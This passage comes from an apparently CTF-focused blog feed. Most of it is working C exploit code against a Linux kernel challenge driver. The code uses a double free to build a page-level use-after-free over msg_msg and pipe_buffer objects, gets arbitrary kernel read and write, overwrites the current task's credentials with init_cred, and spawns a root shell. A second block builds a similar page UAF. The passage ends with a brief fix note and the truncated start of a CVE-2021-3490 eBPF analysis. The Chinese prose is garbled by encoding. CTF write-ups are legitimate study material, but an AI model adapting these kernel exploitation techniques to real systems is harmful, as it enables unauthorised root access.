RECV_MSG 0x114514</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SEND_MSG 0x1919810</span><br><br><span class="hljs-comment">/* message header */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_hdr</span> &#123;</span><br>    <span class="hljs-type">uint16_t</span> type;<br>    <span class="hljs-type">uint16_t</span> cmd;<br>    <span class="hljs-type">uint16_t</span> status;    <span class="hljs-comment">/* for TYPE_REPLY only */</span><br>    <span class="hljs-type">size_t</span>  tag;        <span class="hljs-comment">/* for user to identify different message */</span><br>    <span class="hljs-type">size_t</span> data_len;<br>    <span class="hljs-type">char</span> data[<span class="hljs-number">0</span>];<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tea_crypt_info</span> &#123;</span><br>    <span class="hljs-type">uint32_t</span> key[<span class="hljs-number">4</span>];<br>    <span class="hljs-type">char</span> text[<span class="hljs-number">0</span>];<br>&#125;;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> set_msg_hdr(_hdr, _type, _cmd, _status, _tag, _data_len)        \</span><br><span class="hljs-meta">    do &#123;                                                        \</span><br><span class="hljs-meta">        _hdr-&gt;type = _type;                                     \</span><br><span class="hljs-meta">        _hdr-&gt;cmd = _cmd;                                       \</span><br><span class="hljs-meta">        _hdr-&gt;status = _status;                                 \</span><br><span class="hljs-meta">        _hdr-&gt;tag = _tag;                                       \</span><br><span class="hljs-meta">        _hdr-&gt;data_len = _data_len;                             \</span><br><span class="hljs-meta">    &#125; while (0)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> get_hdr_data(__hdr, ptr_type) (&#123;                        \</span><br><span class="hljs-meta">    ((ptr_type*) &amp;__hdr-&gt;data);                                 \</span><br><span class="hljs-meta">&#125;)</span><br><br><span class="hljs-type">long</span> <span class="hljs-title function_">kkk_send_msg</span><span class="hljs-params">(<span class="hljs-type">int</span> dev_fd, <span class="hljs-keyword">struct</span> msg_hdr *msg)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> ioctl(dev_fd, SEND_MSG, msg);<br>&#125;<br><br><span class="hljs-type">long</span> <span class="hljs-title function_">kkk_recv_msg</span><span class="hljs-params">(<span class="hljs-type">int</span> dev_fd, <span class="hljs-keyword">struct</span> msg_hdr *msg)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> ioctl(dev_fd, RECV_MSG, msg);<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *  III - FIRST exploit stage - make page-level UAF</span><br><span class="hljs-comment">*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SECOND_LEVEL_PIPE_NUM 0x100</span><br><br><span class="hljs-type">int</span> rw_pipe[<span class="hljs-number">2</span>];<br><span class="hljs-type">int</span> second_level_pipe[SECOND_LEVEL_PIPE_NUM][<span class="hljs-number">2</span>];<br><span class="hljs-type">int</span> msqid;<br><span class="hljs-type">size_t</span> msg_buf[<span class="hljs-number">0x1000</span>], *pipe_buf, pipe_ops;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">construct_uaf_on_msg_and_pipe</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_hdr</span> *<span class="hljs-title">msg</span>;</span><br>    <span class="hljs-type">size_t</span> checksum;<br>    <span class="hljs-type">int</span> ret;<br>    <span class="hljs-type">char</span> *buf;<br><br>    msqid = get_msg_queue();<br><br>    msg = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x200</span>);<br>    <span class="hljs-built_in">memset</span>(msg, <span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-keyword">sizeof</span>(*msg));<br>    set_msg_hdr(msg, TYPE_REQUEST, CMD_ENCRYPT_TEA, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">160</span> - <span class="hljs-keyword">sizeof</span>(*msg));<br><br>    <span class="hljs-comment">/* prepare the pipes in advance */</span><br>    pipe(rw_pipe);<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * trigger double free to make pipe_buffer and msg_seg the same object.</span><br><span class="hljs-comment">     * note that we should write and read the pipe in advance, so that it won&#x27;t</span><br><span class="hljs-comment">     * use the pipe_buffer[0], which will lead to an invalid msg_seg</span><br><span class="hljs-comment">     */</span><br>    kkk_send_msg(dev_fd, msg);<br>    sleep(<span class="hljs-number">2</span>);<br>    <span class="hljs-keyword">if</span> (kkk_recv_msg(dev_fd, (<span class="hljs-keyword">struct</span> msg_hdr *) <span class="hljs-number">0xbeefedead0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[=] errno: %d\n&quot;</span>, errno);<br>    &#125;<br>    fcntl(rw_pipe[<span class="hljs-number">0</span>], F_SETPIPE_SZ, <span class="hljs-number">0x1000</span> * <span class="hljs-number">4</span>);<br>    write(rw_pipe[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br>    read(rw_pipe[<span class="hljs-number">0</span>], &amp;checksum, <span class="hljs-number">8</span>);<br>    write(rw_pipe[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br><br>    <span class="hljs-keyword">if</span> (kkk_recv_msg(dev_fd, (<span class="hljs-keyword">struct</span> msg_hdr *) <span class="hljs-number">0xdeadbeef0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[=] errno: %d\n&quot;</span>, errno);<br>    &#125;<br>    write_msg(msqid, msg_buf, <span class="hljs-number">0x1000</span> + <span class="hljs-number">160</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg) - <span class="hljs-number">8</span>, <span class="hljs-number">0x41</span>);<br><br>    write(rw_pipe[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br><br>    peek_msg(msqid, msg_buf, <span class="hljs-number">0x1000</span> + <span class="hljs-number">160</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg) - <span class="hljs-number">8</span>, <span class="hljs-number">0</span>);<br>    pipe_buf = (<span class="hljs-type">size_t</span>*) ((<span class="hljs-type">size_t</span>) msg_buf + <span class="hljs-number">0x1000</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg));<br>    <span class="hljs-keyword">if</span> (pipe_buf[<span class="hljs-number">12</span>] &lt; <span class="hljs-number">0xffffffff81000000</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to make UAF on pipe!&quot;</span>);<br>    &#125;<br>    pipe_ops = pipe_buf[<span class="hljs-number">12</span>];<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successfully build UAF pipe_buffer!\033[0m&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Page: \033[0m%lx &quot;</span>, pipe_buf[<span class="hljs-number">10</span>]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m, ops: \033[0m%lx\n&quot;</span>, pipe_ops);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">fake_buf</span>;</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">arbitrary_read_by_pipe</span><span class="hljs-params">(<span class="hljs-type">size_t</span> page_addr, <span class="hljs-type">void</span> *buf)</span><br>&#123;<br>    fake_buf = (<span class="hljs-keyword">struct</span> pipe_buffer*) &amp;pipe_buf[<span class="hljs-number">5</span>];<br>    read_msg(msqid, msg_buf, <span class="hljs-number">0x1000</span> + <span class="hljs-number">160</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg) - <span class="hljs-number">8</span>, <span class="hljs-number">0x41</span>);<br><br>    fake_buf-&gt;page = (<span class="hljs-keyword">struct</span> page*) page_addr;<br>    fake_buf-&gt;len = <span class="hljs-number">0x1ff8</span>;<br>    fake_buf-&gt;offset = <span class="hljs-number">0</span>;<br>    fake_buf-&gt;ops = (<span class="hljs-keyword">struct</span> pipe_buf_operations*) pipe_ops;<br><br>    write_msg(msqid, msg_buf, <span class="hljs-number">0x1000</span> + <span class="hljs-number">160</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg) - <span class="hljs-number">8</span>, <span class="hljs-number">0x41</span>);<br><br>    read(rw_pipe[<span class="hljs-number">0</span>], buf, <span class="hljs-number">0xfff</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">arbitrary_write_by_pipe</span><span class="hljs-params">(<span class="hljs-type">size_t</span> page_addr, <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> len)</span><br>&#123;<br>    fake_buf = (<span class="hljs-keyword">struct</span> pipe_buffer*) &amp;pipe_buf[<span class="hljs-number">10</span>];<br>    read_msg(msqid, msg_buf, <span class="hljs-number">0x1000</span> + <span class="hljs-number">160</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg) - <span class="hljs-number">8</span>, <span class="hljs-number">0x41</span>);<br><br>    fake_buf-&gt;page = (<span class="hljs-keyword">struct</span> page*) page_addr;<br>    fake_buf-&gt;len = <span class="hljs-number">0</span>;<br>    fake_buf-&gt;offset = <span class="hljs-number">0</span>;<br>    fake_buf-&gt;ops = (<span class="hljs-keyword">struct</span> pipe_buf_operations*) pipe_ops;<br><br>    write_msg(msqid, msg_buf, <span class="hljs-number">0x1000</span> + <span class="hljs-number">160</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg) - <span class="hljs-number">8</span>, <span class="hljs-number">0x41</span>);<br><br>    len = len &gt; <span class="hljs-number">0xffe</span> ? <span class="hljs-number">0xffe</span> : len;<br><br>    write(rw_pipe[<span class="hljs-number">1</span>], buf, len);<br>&#125;<br><br><span class="hljs-type">size_t</span> data_buf[<span class="hljs-number">0x1000</span>], *tsk_buf, current_task_page, current_task, parent_task;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">seek_current_task_struct</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">size_t</span>  *comm_addr;<br><br>    vmemmap_base = pipe_buf[<span class="hljs-number">10</span>] &amp; <span class="hljs-number">0xfffffffff0000000</span>;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] vmemmap_base:\033[0m 0x%lx\n\n&quot;</span>, vmemmap_base);<br><br>    <span class="hljs-comment">/* now seeking for the task_struct in kernel memory */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Seeking task_struct in memory...&quot;</span>);<br><br>    prctl(PR_SET_NAME, <span class="hljs-string">&quot;arttnba3pwnn&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; <span class="hljs-number">1</span>; i++) &#123;<br>        arbitrary_read_by_pipe(vmemmap_base + i * <span class="hljs-number">0x40</span>, data_buf);<br>    <br>        comm_addr = memmem(data_buf, <span class="hljs-number">0xf00</span>, <span class="hljs-string">&quot;arttnba3pwnn&quot;</span>, <span class="hljs-number">12</span>);<br>        <span class="hljs-keyword">if</span> (comm_addr &amp;&amp; (comm_addr[<span class="hljs-number">-2</span>] &gt; <span class="hljs-number">0xffff888000000000</span>) <span class="hljs-comment">/* task-&gt;cred */</span><br>            &amp;&amp; (comm_addr[<span class="hljs-number">-3</span>] &gt; <span class="hljs-number">0xffff888000000000</span>) <span class="hljs-comment">/* task-&gt;real_cred */</span><br>            &amp;&amp; (comm_addr[<span class="hljs-number">-61</span>] &gt; <span class="hljs-number">0xffff888000000000</span>) <span class="hljs-comment">/* task-&gt;read_parent */</span><br>            &amp;&amp; (comm_addr[<span class="hljs-number">-60</span>] &gt; <span class="hljs-number">0xffff888000000000</span>)) &#123;  <span class="hljs-comment">/* task-&gt;parent */</span><br><br>            <span class="hljs-comment">/* task-&gt;read_parent */</span><br>            parent_task = comm_addr[<span class="hljs-number">-61</span>];<br><br>            <span class="hljs-comment">/* task_struct::ptraced */</span><br>            current_task = comm_addr[<span class="hljs-number">-54</span>] - <span class="hljs-number">2528</span>;<br><br>            page_offset_base = (comm_addr[<span class="hljs-number">-54</span>]&amp;<span class="hljs-number">0xfffffffffffff000</span>) - i * <span class="hljs-number">0x1000</span>;<br>            page_offset_base &amp;= <span class="hljs-number">0xfffffffff0000000</span>;<br><br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found task_struct on page: \033[0m%lx\n&quot;</span>,<br>                   (vmemmap_base + i * <span class="hljs-number">0x40</span>));<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] page_offset_base: \033[0m0x%lx\n&quot;</span>,<br>                   page_offset_base);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] current task_struct&#x27;s addr: \033[0m&quot;</span><br>                   <span class="hljs-string">&quot;0x%lx\n\n&quot;</span>, current_task);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">privilege_escalation_by_task_overwrite</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-comment">/* finding the init_task, the final parent of every task */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Seeking for init_task...&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (;;) &#123;<br>        <span class="hljs-type">size_t</span> ptask_page_addr = direct_map_addr_to_page_addr(parent_task);<br><br>        tsk_buf = (<span class="hljs-type">size_t</span>*) ((<span class="hljs-type">size_t</span>) data_buf + (parent_task &amp; <span class="hljs-number">0xfff</span>));<br><br>        arbitrary_read_by_pipe(ptask_page_addr, data_buf);<br>        arbitrary_read_by_pipe(ptask_page_addr+<span class="hljs-number">0x40</span>, &amp;data_buf[<span class="hljs-number">512</span>]);<br><br>        <span class="hljs-comment">/* task_struct::real_parent */</span><br>        <span class="hljs-keyword">if</span> (parent_task == tsk_buf[<span class="hljs-number">309</span>]) &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        parent_task = tsk_buf[<span class="hljs-number">309</span>];<br>    &#125;<br><br>    init_task = parent_task;<br>    init_cred = tsk_buf[<span class="hljs-number">367</span>];<br>    init_nsproxy = tsk_buf[<span class="hljs-number">381</span>];<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found init_task: \033[0m0x%lx\n&quot;</span>, init_task);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found init_cred: \033[0m0x%lx\n&quot;</span>, init_cred);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found init_nsproxy:\033[0m0x%lx\n&quot;</span>,init_nsproxy);<br><br>    <span class="hljs-comment">/* now, changing the current task_struct to get the full root :) */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Escalating ROOT privilege now...&quot;</span>);<br><br>    current_task_page = direct_map_addr_to_page_addr(current_task);<br><br>    arbitrary_read_by_pipe(current_task_page, data_buf);<br>    arbitrary_read_by_pipe(current_task_page + <span class="hljs-number">0x40</span>, &amp;data_buf[<span class="hljs-number">512</span>]);<br><br>    tsk_buf = (<span class="hljs-type">size_t</span>*) ((<span class="hljs-type">size_t</span>) data_buf + (current_task &amp; <span class="hljs-number">0xfff</span>));<br>    tsk_buf[<span class="hljs-number">367</span>] = init_cred;<br>    tsk_buf[<span class="hljs-number">368</span>] = init_cred;<br>    tsk_buf[<span class="hljs-number">381</span>] = init_nsproxy;<br><br>    arbitrary_write_by_pipe(current_task_page, data_buf, <span class="hljs-number">0xff0</span>);<br>    arbitrary_write_by_pipe(current_task_page + <span class="hljs-number">0x40</span>, &amp;data_buf[<span class="hljs-number">512</span>], <span class="hljs-number">0xff0</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Done.\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    save_status();<br>    bind_core(<span class="hljs-number">0</span>);<br><br>    dev_fd = open(<span class="hljs-string">&quot;/dev/kkk&quot;</span>, O_RDWR);<br>    <span class="hljs-keyword">if</span> (dev_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to open /dev/kkk!&quot;</span>);<br>    &#125;<br><br>    construct_uaf_on_msg_and_pipe();<br>    seek_current_task_struct();<br>    privilege_escalation_by_task_overwrite();<br>    get_root_shell();<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>è¿è¡Œå³å¯å®Œæˆææƒï¼š</p><p><img src="https://s2.loli.net/2023/07/13/sr65qaWAN9lE4Cy.png" alt="image.png"></p><blockquote><p><del>ç¬”è€…ä¹Ÿä¸è®°å¾—è¯¥ç¼–è¯‘é€‰é¡¹æ˜¯å¦é»˜è®¤å¼€å¯äº†</del>ï¼Œè‹¥æœªå¼€å¯è¯¥ç¼–è¯‘é€‰é¡¹ï¼Œåˆ™ä»å¯ä»¥ç›´æ¥æ„é€  page-level UAFï¼Œä»¥ç¬”è€…å»å¹´å‡ºçš„é¢˜ç›® <code>d3kheap</code> ä¸ºä¾‹ï¼Œå¯ä»¥é€šè¿‡å¦‚ä¸‹æ–¹å¼å®Œæˆ page UAF çš„æ„é€ ï¼Œç»†èŠ‚å‚è§æ³¨é‡Šï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> SECOND_LEVEL_PIPE_NUM 0x100</span><br><br><span class="hljs-type">int</span> victim_pipe[<span class="hljs-number">2</span>], vuln_pipe[<span class="hljs-number">2</span>], holder_pipe[<span class="hljs-number">2</span>];<br><span class="hljs-type">int</span> second_level_pipe[SECOND_LEVEL_PIPE_NUM][<span class="hljs-number">2</span>];<br><span class="hljs-type">size_t</span> pipe_buf[<span class="hljs-number">0x1000</span>];<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">construct_page_uaf_with_pipe</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> checksum;<br><br>    <span class="hljs-built_in">memset</span>(pipe_buf, <span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-keyword">sizeof</span>(pipe_buf));<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SECOND_LEVEL_PIPE_NUM; i++) &#123;<br>        pipe(second_level_pipe[i]);<br>    &#125;<br><br>    <span class="hljs-comment">/* make two pipes point to the same buffer */</span><br>    add();<br>    del();<br>    pipe(victim_pipe);<br>    <br>    del();<br>    pipe(vuln_pipe);<br><br>    <span class="hljs-comment">/* init pipe-&gt;head and pipe-&gt;tail, allocate page on buffer */</span><br>    write(victim_pipe[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;rat3bant&quot;</span>, <span class="hljs-number">8</span>);<br>    write(vuln_pipe[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br><br>    <span class="hljs-comment">/* migrate to another buffer, now we have two bufs point on the same page */</span><br>    fcntl(vuln_pipe[<span class="hljs-number">0</span>], F_SETPIPE_SZ, <span class="hljs-number">0x1000</span> * <span class="hljs-number">4</span>);<br>    write(vuln_pipe[<span class="hljs-number">1</span>], pipe_buf, <span class="hljs-number">0x800</span>); <span class="hljs-comment">/* pre-write for later read */</span><br><br>    read(vuln_pipe[<span class="hljs-number">0</span>], &amp;checksum, <span class="hljs-number">8</span>);<br>    <span class="hljs-keyword">if</span> (checksum != *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] Get checksum: %lx\n&quot;</span>, checksum);<br>        err_exit(<span class="hljs-string">&quot;two pipe didn&#x27;t share the same page!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* now the page is reclaimed to pipe-&gt;tmp_page */</span><br>    read(victim_pipe[<span class="hljs-number">0</span>], &amp;checksum, <span class="hljs-number">8</span>);<br>    <span class="hljs-keyword">if</span> (checksum != *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] Get checksum: %lx\n&quot;</span>, checksum);<br>        err_exit(<span class="hljs-string">&quot;Pipe is corrupted!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* avoid double free dtection */</span><br>    pipe(holder_pipe);<br><br>    <span class="hljs-comment">/* free pipe-&gt;tmp_page */</span><br>    close(victim_pipe[<span class="hljs-number">1</span>]);<br>    close(victim_pipe[<span class="hljs-number">0</span>]);<br><br>    <span class="hljs-comment">/* allocate UAF page as slub page */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SECOND_LEVEL_PIPE_NUM; i++) &#123;<br>        fcntl(second_level_pipe[i][<span class="hljs-number">0</span>], F_SETPIPE_SZ, <span class="hljs-number">0x1000</span> * <span class="hljs-number">2</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* init pipe bufs on UAF page */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SECOND_LEVEL_PIPE_NUM; i++) &#123;<br>        write(second_level_pipe[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* enjoy page-level UAF now :) */</span><br>    read(vuln_pipe[<span class="hljs-number">0</span>], pipe_buf, <span class="hljs-number">0x700</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; (<span class="hljs-number">0x700</span> / <span class="hljs-number">8</span>); i++) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[----data dump----][%d] %lx\n&quot;</span>, i, pipe_buf[i]);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></blockquote><h2 id="æ¼æ´ä¿®å¤-1"><a href="#æ¼æ´ä¿®å¤-1" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2><p>æ¼æ´ä¿®å¤å…¶å®æ¯”è¾ƒç®€å•ï¼Œåªéœ€è¦æŠŠè¯»å–å¤±è´¥çš„åŸºæœ¬å—çš„è·³è½¬ç›®æ ‡æ”¹åˆ° <code>kfree()</code> ä¹‹åå³å¯ï¼š</p><p><img src="https://s2.loli.net/2023/07/14/qdhrM5PyWXYa1Bi.png" alt="image.png"></p><p><img src="https://s2.loli.net/2023/07/14/cdaSR5grHwkG4PL.png" alt="image.png"></p><h1 id="0x03-æ€»ç»“"><a href="#0x03-æ€»ç»“" class="headerlink" title="0x03. æ€»ç»“"></a>0x03. æ€»ç»“</h1><p>æ„Ÿè§‰å¥½åƒä¹Ÿæ²¡æœ‰ä»€ä¹ˆå¥½æ€»ç»“çš„â€¦æ¯”è¾ƒæ²¡å•¥äº®ç‚¹çš„ä¸¤é“å¥—è·¯é¢˜ç½¢äº†â€¦</p><p><img src="https://s2.loli.net/2023/07/14/TmiUfboV49py2rP.png" alt="image.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;å…¸ä¸­å…¸ä¹‹ä½è´¨é‡å¥—è·¯ Pwn é¢˜é›†åˆ&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://arttnba3.github.io/categories/CTF/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="Pwn" scheme="https://arttnba3.github.io/tags/Pwn/"/>
    
    <category term="ä¿¡æ¯å®‰å…¨" scheme="https://arttnba3.github.io/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="CTF" scheme="https://arttnba3.github.io/tags/CTF/"/>
    
    <category term="Use After Free" scheme="https://arttnba3.github.io/tags/Use-After-Free/"/>
    
    <category term="Linux Kernel" scheme="https://arttnba3.github.io/tags/Linux-Kernel/"/>
    
    <category term="CISCN" scheme="https://arttnba3.github.io/tags/CISCN/"/>
    
    <category term="Kernel UAF" scheme="https://arttnba3.github.io/tags/Kernel-UAF/"/>
    
  </entry>
  
  <entry>
    <title>ã€CVE.0x0Aã€‘CVE-2021-3490 æ¼æ´å¤ç°åŠç®€è¦åˆ†æ</title>
    <link href="https://arttnba3.github.io/2023/06/04/CVE-0X0A-CVE-2021-3490/"/>
    <id>https://arttnba3.github.io/2023/06/04/CVE-0X0A-CVE-2021-3490/</id>
    <published>2023-06-03T18:59:40.000Z</published>
    <updated>2023-06-12T21:01:10.000Z</updated>
    
    <content type="html"><![CDATA[<p>é‚£ä¸€å¤©ï¼Œa3 ç»ˆäºå›æƒ³èµ·äº†è¢« VM Pwn æ”¯é…çš„ææ€–</p><span id="more"></span><h1 id="0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰"><a href="#0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰" class="headerlink" title="0x00. ä¸€åˆ‡å¼€å§‹ä¹‹å‰"></a>0x00. ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-3490">CVE-2021-3490</a> æ˜¯ä¸€ä¸ªå‘ç”Ÿåœ¨ eBPF verifier ä¸­çš„æ¼æ´ï¼Œç”±äº eBPF verifier åœ¨æ ¡éªŒä½è¿ç®—æ“ä½œï¼ˆ ä¸ã€æˆ–ã€å¼‚æˆ– ï¼‰æ—¶æ²¡æœ‰æ­£ç¡®åœ°æ›´æ–°å¯„å­˜å™¨çš„ 32 ä½è¾¹ç•Œï¼Œä»è€Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥æ„é€ å‡ºéæ³•çš„è¿è¡Œæ—¶å¯„å­˜å™¨å€¼ä»¥è¿›è¡Œææƒï¼›è¯¥æ¼æ´åœ¨ <a href="https://lore.kernel.org/bpf/158560419880.10843.11448220440809118343.stgit@john-Precision-5820-Tower/">è¿™ä¸ª commit</a> ä¸­è¢«å¼•å…¥ï¼Œåœ¨ <a href="https://git.kernel.org/pub/scm/linux/kernel/git/bpf/bpf.git/commit/?id=049c4e13714ecbca567b4d5f6d563f05d431c80e">è¿™ä¸ª commit</a> ä¸­è¢«ä¿®å¤</p><p>æœ¬æ–‡æˆ‘ä»¬é€‰æ‹©å†…æ ¸ç‰ˆæœ¬ <code>5.11.16</code> è¿›è¡Œåˆ†æ</p><blockquote><p>æ³¨ï¼šeBPF ç›¸å…³åŸºç¡€çŸ¥è¯†å¯ä»¥çœ‹<a href="https://arttnba3.cn/2023/05/31/EBPF_0X00/">è¿™â†‘é‡Œâ†“</a></p></blockquote><h1 id="0x01-æ¼æ´åˆ†æ"><a href="#0x01-æ¼æ´åˆ†æ" class="headerlink" title="0x01. æ¼æ´åˆ†æ"></a>0x01. æ¼æ´åˆ†æ</h1><p>eBPF æŒ‡ä»¤çš„åˆæ³•æ€§æ ¡éªŒé€šè¿‡ eBPF verifier å®Œæˆï¼ŒeBPF verifier çš„æ ¸å¿ƒå‡½æ•°ä¾¿æ˜¯ 